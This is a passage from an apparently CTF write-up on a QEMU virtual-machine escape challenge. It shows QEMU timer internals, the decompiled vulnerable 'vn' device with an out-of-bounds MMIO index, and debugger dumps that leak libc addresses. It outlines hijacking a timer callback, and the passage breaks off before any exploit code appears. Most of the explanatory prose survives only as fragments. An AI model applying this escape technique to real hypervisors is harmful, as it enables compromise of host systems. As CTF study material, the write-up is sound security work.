class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">    QEMU_CLOCK_REALTIME = <span class="number">0</span>,</span><br><span class="line">    QEMU_CLOCK_VIRTUAL = <span class="number">1</span>,</span><br><span class="line">    QEMU_CLOCK_HOST = <span class="number">2</span>,</span><br><span class="line">    QEMU_CLOCK_VIRTUAL_RT = <span class="number">3</span>,</span><br><span class="line">    QEMU_CLOCK_MAX</span><br><span class="line">&#125; QEMUClockType;</span><br><span class="line"></span><br><span class="line"><span class="built_in">init_clocks</span>(qemu_timer_notify_cb);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_clocks</span><span class="params">(QEMUTimerListNotifyCB *notify_cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUClockType type;</span><br><span class="line">    <span class="keyword">for</span> (type = <span class="number">0</span>; type &lt; QEMU_CLOCK_MAX; type++) &#123;</span><br><span class="line">        <span class="built_in">qemu_clock_init</span>(type, notify_cb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PRCTL_PR_SET_TIMERSLACK</span></span><br><span class="line">    <span class="built_in">prctl</span>(PR_SET_TIMERSLACK, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">qemu_clock_init</span><span class="params">(QEMUClockType type, QEMUTimerListNotifyCB *notify_cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUClock *clock = <span class="built_in">qemu_clock_ptr</span>(type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assert that the clock of type TYPE has not been initialized yet. */</span></span><br><span class="line">    <span class="built_in">assert</span>(main_loop_tlg.tl[type] == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    clock-&gt;type = type;</span><br><span class="line">    clock-&gt;enabled = (type == QEMU_CLOCK_VIRTUAL ? <span class="literal">false</span> : <span class="literal">true</span>);</span><br><span class="line">    clock-&gt;last = INT64_MIN;</span><br><span class="line">    <span class="built_in">QLIST_INIT</span>(&amp;clock-&gt;timerlists);</span><br><span class="line">    <span class="built_in">notifier_list_init</span>(&amp;clock-&gt;reset_notifiers);</span><br><span class="line">    main_loop_tlg.tl[type] = <span class="built_in">timerlist_new</span>(type, notify_cb, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> QEMUClock *<span class="title">qemu_clock_ptr</span><span class="params">(QEMUClockType type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;qemu_clocks[type];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> QEMUClock qemu_clocks[QEMU_CLOCK_MAX];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>qemu timer  timerlist  <code>timerlist_run_timers()</code>  <code>cb(opaque)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimerListGroup</span> &#123;</span><br><span class="line">    QEMUTimerList *tl[QEMU_CLOCK_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QLIST_ENTRY(type)                                               \</span></span><br><span class="line"><span class="meta">struct &#123;                                                                \</span></span><br><span class="line"><span class="meta">        struct type *le_next;   <span class="comment">/* next element */</span>                      \</span></span><br><span class="line"><span class="meta">        struct type **le_prev;  <span class="comment">/* address of previous next element */</span>  \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimerList</span> &#123;</span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    <span class="built_in">QLIST_ENTRY</span>(QEMUTimerList) list;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist&#x27;s running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimer</span> &#123;</span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">timer_init_full</span><span class="params">(QEMUTimer *ts,</span></span></span><br><span class="line"><span class="params"><span class="function">                     QEMUTimerListGroup *timer_list_group, QEMUClockType type,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span> scale, <span class="type">int</span> attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">                     QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>gdb <code>gdb -x script</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file ./qemu-system-x86_64 </span><br><span class="line"><span class="built_in">set</span> args -L ./pc-bios \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio.gz \</span><br><span class="line">    -device vn \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null -s</span><br><span class="line"></span><br><span class="line">start</span><br><span class="line">brva 0x114514</span><br></pre></td></tr></table></figure><p> gdb </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -af | grep qemu</span><br><span class="line">$ gdb -x script -p &lt;pid&gt;</span><br></pre></td></tr></table></figure><h2 id="VNCTF2024-escape-langlang-mountain2"><a href="#VNCTF2024-escape-langlang-mountain2" class="headerlink" title="VNCTF2024 escape_langlang_mountain2"></a>VNCTF2024 escape_langlang_mountain2</h2><p>ID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">vn_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">PCI_DEVICE_CLASS_23</span>(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ~# lspci</span></span><br><span class="line"><span class="comment">// 00:01.0 Class 0601: 8086:7000</span></span><br><span class="line"><span class="comment">// 00:04.0 Class 00ff: 1234:2024</span></span><br></pre></td></tr></table></figure><p>mmio read&#x2F;write</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">vn_mmio_read</span><span class="params">(__int64 a1, __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">object_dynamic_cast_assert</span>(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21LL</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">vn_mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> __int64 val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="built_in">object_dynamic_cast_assert</span>(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42LL</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + *(<span class="type">int</span> *)(v5 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = val;</span><br><span class="line">      *(_DWORD *)(v5 + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)val &lt;= <span class="number">0x3c</span> )</span><br><span class="line">        *(_DWORD *)(v5 + <span class="number">0xB80</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> &amp;&amp; <span class="built_in">HIDWORD</span>(val) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + <span class="built_in">HIDWORD</span>(val) + <span class="number">0xB40</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int <code>0xb80</code>  <code>-0xb38/-0xb34</code>  <code>g_free</code>mmio_readlibc_base</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x563076e46c30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span> rax <span class="number">0x563076e46c30</span>  <span class="number">0x563075f58410</span>  <span class="number">0x563075e16170</span>  <span class="number">0x563075e162f0</span>  <span class="number">0x6e76</span> <span class="comment">/* &#x27;vn&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>     <span class="number">0x563076e46c38</span>  <span class="number">0x7faffb78bd50</span> (g_free)  endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>     <span class="number">0x563076e46c40</span>  <span class="number">0x563076dfa5e0</span>  <span class="number">0x8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>     <span class="number">0x563076e46c48</span>  <span class="number">9</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>     <span class="number">0x563076e46c50</span>  <span class="number">0x5630760bfaa0</span>  <span class="number">0x563075ff81a0</span>  <span class="number">0x563075e5f3b0</span>  <span class="number">0x563075e5f530</span>  ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>     <span class="number">0x563076e46c58</span>  <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>     <span class="number">0x563076e46c60</span>  <span class="number">0x5630760c7550</span>  <span class="string">&#x27;/machine/peripheral-anon/device[0]&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>     <span class="number">0x563076e46c68</span>  <span class="number">0x1</span></span><br></pre></td></tr></table></figure><p></p><ul><li>WP <a href="https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp">escape_langlang_mountain2 WP</a></li></ul><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit 1"></a>Exploit 1</h3><p>QEMUTimerListQEMUTimerqemu main_loop_tlg QEMUTimercb(opaque)<code>timerlist_run_timers</code><code>ts = timer_list-&gt;active_timers</code>tsQEMUTimercb(opaque)<code>timer_list-&gt;active_timers</code>QEMUTimer</p><p><a href="https://a1ex.online/2021/10/24/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">CVE-2019-6788-Qemu</a></p><p>MemoryRegionopsqemuopaquevn</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_loop_tlg</span><br><span class="line"><span class="variable">$5</span> = (&lt;data variable, no debug info&gt; *) 0x556d37e68480 &lt;main_loop_tlg&gt;</span><br><span class="line">pwndbg&gt; tele 0x556d37e68480</span><br><span class="line">00:0000  0x556d37e68480 (main_loop_tlg)  0x556d3915d7c0  0x556d37e684a0 (qemu_clocks)  0x556d3915dc70  0x556d37e684a0</span><br><span class="line">01:0008  0x556d37e68488 (main_loop_tlg+8)  0x556d3915d840  0x556d37e684b0 (qemu_clocks+16)  0x556d3915dcf0  0x556d37e684b0</span><br><span class="line">02:0010  0x556d37e68490 (main_loop_tlg+16)  0x556d3915d8c0  0x556d37e684c0 (qemu_clocks+32)  0x556d3915dd70  0x556d37e684c0</span><br><span class="line">03:0018  0x556d37e68498 (main_loop_tlg+24)  0x556d3915d940  0x556d37e684d0 (qemu_clocks+48)  0x556d3915ddf0  0x556d37e684d0</span><br><span class="line">04:0020  0x556d37e684a0 (qemu_clocks)  0x556d3915dc70  0x556d37e684a0</span><br><span class="line">05:0028  0x556d37e684a8 (qemu_clocks+8)  0x100000000</span><br><span class="line">06:0030  0x556d37e684b0 (qemu_clocks+16)  0x556d3915dcf0  0x556d37e684b0</span><br><span class="line">07:0038  0x556d37e684b8 (qemu_clocks+24)  0x100000001</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x556d3a13bc30+0xb40-192</span><br><span class="line">00:0000  0x556d3a13c6b0  0x556d379071e0 (vn_mmio_ops)  0x556d36e0a458 (vn_mmio_read)  endbr64</span><br><span class="line">01:0008  0x556d3a13c6b8  0x556d3a13bc30  0x556d3924d410  0x556d3910b170  0x556d3910b2f0  ...</span><br><span class="line">02:0010  0x556d3a13c6c0  0x556d3945c840  0x556d39200d80  0x556d391523c0  0x556d39152540  ...</span><br><span class="line">03:0018  0x556d3a13c6c8  0x0</span><br><span class="line">04:0020  0x556d3a13c6d0  0x1000</span><br><span class="line">05:0028  0x556d3a13c6d8  0x0</span><br><span class="line">06:0030  0x556d3a13c6e0  0xfebf1000</span><br><span class="line">07:0038  0x556d3a13c6e8  0x556d371da35b (memory_region_destructor_none)  endbr64</span><br></pre></td></tr></table></figure><p>mmio_ops opaque<code>VNState</code>chunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MemoryRegion</span> &#123;</span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> unmergeable;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line">    <span class="comment">/* owner as TYPE_DEVICE. Used for re-entrancy checks in MR access hotpath */</span></span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x556d3a13bc30</span><span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x50</span></span><br><span class="line">size : <span class="number">0xba0</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br></pre></td></tr></table></figure><p>QEMUTimer<code>main_loop_tlg[1]</code>  <code>active_timer</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x555c4c77e480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>  <span class="number">0x555c4c77e480</span> (main_loop_tlg)  <span class="number">0x555c4dfb97c0</span>  <span class="number">0x555c4c77e4a0</span> (qemu_clocks)  <span class="number">0x555c4dfb9c70</span>  <span class="number">0x555c4c77e4a0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>  <span class="number">0x555c4c77e488</span> (main_loop_tlg+<span class="number">8</span>)  <span class="number">0x555c4dfb9840</span>  <span class="number">0x555c4c77e4b0</span> (qemu_clocks+<span class="number">16</span>)  <span class="number">0x555c4dfb9cf0</span>  <span class="number">0x555c4c77e4b0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>  <span class="number">0x555c4c77e490</span> (main_loop_tlg+<span class="number">16</span>)  <span class="number">0x555c4dfb98c0</span>  <span class="number">0x555c4c77e4c0</span> (qemu_clocks+<span class="number">32</span>)  <span class="number">0x555c4dfb9d70</span>  <span class="number">0x555c4c77e4c0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>  <span class="number">0x555c4c77e498</span> (main_loop_tlg+<span class="number">24</span>)  <span class="number">0x555c4dfb9940</span>  <span class="number">0x555c4c77e4d0</span> (qemu_clocks+<span class="number">48</span>)  <span class="number">0x555c4dfb9df0</span>  <span class="number">0x555c4c77e4d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>  <span class="number">0x555c4c77e4a0</span> (qemu_clocks)  <span class="number">0x555c4dfb9c70</span>  <span class="number">0x555c4c77e4a0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>  <span class="number">0x555c4c77e4a8</span> (qemu_clocks+<span class="number">8</span>)  <span class="number">0x100000000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>  <span class="number">0x555c4c77e4b0</span> (qemu_clocks+<span class="number">16</span>)  <span class="number">0x555c4dfb9cf0</span>  <span class="number">0x555c4c77e4b0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>  <span class="number">0x555c4c77e4b8</span> (qemu_clocks+<span class="number">24</span>)  <span class="number">0x100000001</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>xg <span class="number">0x555c4dfb97c0</span></span><br><span class="line"><span class="number">0x555c4dfb97c0</span>: <span class="number">0x0000555c4c77e4a0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97e0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97f0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x555c4dfb9800</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000000004ef98770</span></span><br><span class="line"><span class="number">0x555c4dfb9810</span>: <span class="number">0x0000555c4dfb9cb8</span>      <span class="number">0x0000555c4b8bbeed</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>xg <span class="number">0x555c4dfb9840</span></span><br><span class="line"><span class="number">0x555c4dfb9840</span>: <span class="number">0x0000555c4c77e4b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9850</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9860</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9870</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x555c4dfb9880</span>: <span class="number">0x0000555c4e28ee30</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9890</span>: <span class="number">0x0000555c4dfb9d38</span>      <span class="number">0x0000555c4b8bbeed</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 